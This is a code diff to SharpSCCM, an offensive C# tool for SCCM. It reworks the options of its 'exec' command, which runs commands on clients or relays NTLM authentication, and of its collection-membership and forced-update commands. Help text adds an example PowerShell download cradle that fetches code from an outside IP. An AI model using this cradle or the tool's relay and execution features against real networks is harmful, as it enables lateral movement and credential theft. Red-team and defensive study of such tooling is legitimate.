@@ -9,6 +9,7 @@ using System.Xml.Linq;
 
 // Configuration Manager SDK
 using Microsoft.ConfigurationManagement.Messaging.Framework;
+using Microsoft.ConfigurationManagement.Messaging.Messages;
 
 namespace SharpSCCM
 {
@@ -48,22 +49,22 @@ namespace SharpSCCM
                 //
 
                 // exec command
-                var execCommand = new Command("exec", "Execute an application from a specified UNC path or request NTLM authentication from a client device or collection of client devices\n" +
+                var execCommand = new Command("exec", "Execute a command, binary, or script on a client or request NTLM authentication from a client\n" +
                     "  Permitted security roles:\n" +
                     "    - Full Administrator\n" +
                     "    - Application Administrator\n" +
                     "    Examples:\n" +
                     "    - https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867");
                 rootCommand.Add(execCommand);
-                execCommand.Add(new Option<string>(new[] { "--device", "-d" }, "The ResourceName of the device to execute an application on or receive NTLM authentication from"));
-                execCommand.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the device or user collection to execute an application on or receive NTLM authentication from"));
-                execCommand.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the device or user collection to execute an application on or receive NTLM authentication from"));
-                execCommand.Add(new Option<string>(new[] { "--path", "-p" }, "The local or UNC path of the binary/script the application will execute (e.g., \"C:\\Windows\\System32\\calc.exe\", \"\\\\site-server.domain.com\\Sources$\\my.exe\")"));
+                execCommand.Add(new Option<string>(new[] { "--device", "-d" }, "The ResourceName of the device to execute a command, binary, or script on or receive NTLM authentication from"));
+                execCommand.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the device or user collection to execute a command, binary, or script on or receive NTLM authentication from"));
+                execCommand.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the device or user collection to execute a command, binary, or script on or receive NTLM authentication from"));
+                execCommand.Add(new Option<string>(new[] { "--path", "-p" }, "The command or the UNC path of the binary/script to execute (e.g., \"powershell iwr http://192.168.57.130/a\", \"C:\\Windows\\System32\\calc.exe\", \"\\\\site-server.domain.com\\Sources$\\my.exe\")"));
                 execCommand.Add(new Option<string>(new[] { "--relay-server", "-r" }, "The NetBIOS name, IP address, or if WebClient is enabled on the targeted client device, the IP address and port (e.g., \"192.168.1.1@8080\") of the relay/capture server (default: the machine running SharpSCCM)"));
-                execCommand.Add(new Option<string>(new[] { "--resource-id", "-rid" }, "The unique ResourceID of the device or user to execute an application on or receive NTLM authentication from"));
+                //execCommand.Add(new Option<string>(new[] { "--resource-id", "-rid" }, "The unique ResourceID of the device or user to execute an application on or receive NTLM authentication from"));
                 execCommand.Add(new Option<bool>(new[] { "--run-as-system", "-s" }, "Execute the application in the SYSTEM context (default: logged on user)"));
                 execCommand.Add(new Option<string>(new[] { "--collection-type", "-t" }, "The type of the collection (\"device\" or \"user\")").FromAmong(new string[] { "device", "user" }));
-                execCommand.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to execute an application as or receive NTLM authentication from (e.g., \"APERTURE\\cave.johnson\")"));
+                //execCommand.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to execute an application as or receive NTLM authentication from (e.g., \"APERTURE\\cave.johnson\")"));
                 execCommand.Add(new Option<string>(new[] { "--management-point", "-mp" }, "The IP address, FQDN, or NetBIOS name of the management point to connect to (default: the current management point of the client running SharpSCCM)"));
                 execCommand.Add(new Option<string>(new[] { "--site-code", "-sc" }, "The three character site code (e.g., \"PS1\") (default: the site code of the client running SharpSCCM)"));
                 execCommand.Handler = CommandHandler.Create(
@@ -71,7 +72,7 @@ namespace SharpSCCM
                     {
                         if (string.IsNullOrEmpty(device) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(user))
                         {
-                            Console.WriteLine("[!] Please specify a device (-d), user (-u), collection Name (-n), or CollectionID (-i)");
+                            Console.WriteLine("[!] Please specify a device (-d), collection Name (-n), or CollectionID (-i)");
                         }
                         else if (!String.IsNullOrEmpty(relayServer) && !String.IsNullOrEmpty(path) || (String.IsNullOrEmpty(relayServer) && String.IsNullOrEmpty(path)))
                         {
@@ -230,30 +231,48 @@ namespace SharpSCCM
                     "  Permitted security roles:\n" +
                     "    - Any (SMS Admins local group)");
                 getCommand.Add(getCollectionMember);
-                getCollectionMember.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to add the specified device or user to"));
-                getCollectionMember.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to add the specified device or user to"));
+                getCollectionMember.Add(new Option<string>(new[] { "--device", "-d" }, "The name of the device to get collection membership for (returns all collection members where the name contains the provided string)"));
+                getCollectionMember.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to get members for"));
+                getCollectionMember.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to get members for"));
                 getCollectionMember.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p Name -p IsActive\"") { Arity = ArgumentArity.OneOrMore });
+                getCollectionMember.Add(new Option<string>(new[] { "--resource-id", "-r" }, "The unique ResourceID of the device or user to get applicable rules for"));
+                getCollectionMember.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to get collection membership for (e.g., \"APERTURE\\cave.johnson\") (returns all collection members where the name contains the provided string)"));
                 getCollectionMember.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                 getCollectionMember.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"IsActive='True'\" or \"Name LIKE '%cave-johnson%'\")"));
                 getCollectionMember.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                 // COUNT and ORDER BY don't seem to work when querying SMS_CollectionMember_a
                 getCollectionMember.Handler = CommandHandler.Create(
-                    (string managementPoint, string siteCode, string collectionId, string collectionName, string[] properties, bool verbose, string whereCondition, bool dryRun) =>
+                    (string managementPoint, string siteCode, string device, string collectionId, string collectionName, string[] properties, string user, bool verbose, string whereCondition, bool dryRun) =>
                     {
-                        if (properties.Length == 0 && !verbose)
+                        if (string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(device) && string.IsNullOrEmpty(user))
                         {
-                            properties = new[] { "Collection", "CollectionID", "Domain", "IsActive", "IsApproved", "IsAssigned", "IsClient", "Name", "ResourceID", "SiteCode" };
+                            Console.WriteLine("[!] Please specify a CollectionID (-i), collection Name (-n), device Name (-d), or user Name (-u)");
                         }
-                        if (string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(collectionId))
+                        else if (!string.IsNullOrEmpty(device) && !string.IsNullOrEmpty(user))
                         {
-                            Console.WriteLine("[!] Please specify a collection Name (-n) or CollectionID (-i)");
+                            Console.WriteLine("[!] Please specify either a device Name (-d) or user Name (-u)");
                         }
                         else
                         {
                             ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                             if (wmiConnection != null && wmiConnection.IsConnected)
                             {
-                                MgmtPointWmi.GetCollectionMember(wmiConnection, collectionName, collectionId, properties, dryRun, verbose, true);
+                                if (!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName))
+                                {
+                                    if (properties.Length == 0 && !verbose)
+                                    {
+                                        properties = new[] { "Collection", "CollectionID", "Domain", "IsActive", "IsApproved", "IsAssigned", "IsClient", "Name", "ResourceID", "SiteCode" };
+                                    }
+                                    MgmtPointWmi.GetCollectionMember(wmiConnection, collectionName, collectionId, properties, dryRun, verbose, true);
+                                }
+                                else if (!string.IsNullOrEmpty(device) || !string.IsNullOrEmpty(user))
+                                {
+                                    if (properties.Length == 0 && !verbose)
+                                    {
+                                        properties = new[] { "CollectionID", "Domain", "IsActive", "IsApproved", "IsAssigned", "IsClient", "Name", "ResourceID", "SiteCode" };
+                                    }
+                                    MgmtUtil.GetClassInstances(wmiConnection, "SMS_FullCollectionMembership", null, false, properties, $"Name LIKE '%{(!string.IsNullOrEmpty(device) ? device : user)}%'", null, dryRun, verbose, true, true);
+                                }
                             }
                         }
                     });
@@ -590,19 +609,48 @@ namespace SharpSCCM
                     });
 
                 // invoke update
-                var invokeUpdate = new Command("update", "Force all members of a specified collection to check for updates and execute any new applications that are available\n" +
+                var invokeUpdate = new Command("update", "Force clients to check for updates and execute any new applications that are available\n" +
                     "  Permitted security roles:\n" +
                     "    - Full Administrator\n" +
                     "    - Operations Administrator");
                 invokeCommand.Add(invokeUpdate);
-                invokeUpdate.Add(new Argument<string>("collection", "The name of the collection to force to update"));
+                invokeUpdate.Add(new Option<string>(new[] { "--device", "-d" }, "The name of the device to force to update"));
+                invokeUpdate.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to force to update"));
+                invokeUpdate.Add(new Option<string>(new[] { "--policy-type", "-p" }, "The type of policy to update (default: \"machine\")").FromAmong(new string[] { "machine", "user" }));
+                invokeUpdate.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to force to update"));
+                invokeUpdate.Add(new Option<string>(new[] { "--resource-id", "-r" }, "The unique ResourceID of the device or user to force to update"));
+                invokeUpdate.Add(new Option<string>(new[] { "--collection-type", "-t" }, "The type of the collection (\"device\" or \"user\")").FromAmong(new string[] { "device", "user" }));
+                invokeUpdate.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to force to update, including escaped backslashes (e.g., \"APERTURE\\\\cave.johnson\")"));
                 invokeUpdate.Handler = CommandHandler.Create(
-                    (string managementPoint, string siteCode, string collection) =>
+                    (string managementPoint, string siteCode, string device, string collectionId, string policyType, string collectionName, string resourceId, string collectionType, string user) =>
                     {
-                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
-                        if (wmiConnection != null && wmiConnection.IsConnected)
+
+                        if (string.IsNullOrEmpty(device) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(resourceId) && string.IsNullOrEmpty(user))
                         {
-                            MgmtPointWmi.InvokeUpdate(wmiConnection, collection);
+                            Console.WriteLine("[!] Please specify a collection Name (-n), CollectionID (-i), device Name (-d), user UniqueUserName (-u), or ResourceID (-r) to force to update");
+                        }
+                        else if (!string.IsNullOrEmpty(resourceId) && (string.IsNullOrEmpty(collectionType) && string.IsNullOrEmpty(device) && string.IsNullOrEmpty(user)))
+                        {
+                            Console.WriteLine("[!] Please specify a collection type (-t), a device Name (-d), or user UniqueUserName (-u) when using a ResourceID (-r)");
+                        }
+                        else if (!string.IsNullOrEmpty(device) && !string.IsNullOrEmpty(user))
+                        {
+                            Console.WriteLine("[!] Please specify either a device Name (-d) or a user UniqueUserName (-u)");
+                        }
+                        else
+                        {
+                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
+                            if (wmiConnection != null && wmiConnection.IsConnected)
+                            {
+                                if (string.IsNullOrEmpty(policyType) || policyType == "machine")
+                                {
+                                    MgmtPointWmi.UpdateMachinePolicy(wmiConnection, collectionId, collectionName);
+                                }
+                                else
+                                {
+                                    MgmtPointWmi.UpdateUserPolicy(wmiConnection, collectionId, collectionName, device, resourceId, user);
+                                }
+                            }
                         }
                     });
 
